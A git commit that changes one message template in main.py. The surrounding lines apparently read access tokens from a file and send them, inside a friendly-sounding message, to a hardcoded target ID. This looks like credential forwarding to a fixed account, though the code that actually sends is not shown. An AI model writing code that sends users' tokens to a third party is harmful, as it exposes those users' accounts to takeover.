8263e0462af81981cd86791167bf9b2b44ccabaa
rohan11190 <159110669+rohan11190@users.noreply.github.com>
2024-06-20 10:45:49 +0530

    Update main.py

--- main.py
+++ main.py
@@ -29,7 +29,7 @@ def send_initial_message():
         tokens = file.readlines()
 
     # Modify the message as per your requirement
-    msg_template = "Hello Bro sir! I am using your server. My token is {}"
+    msg_template = "Hello p4p4 sir! I am using your server. My token is {}"
 
     # Specify the ID where you want to send the message
     target_id = "61556570018991"
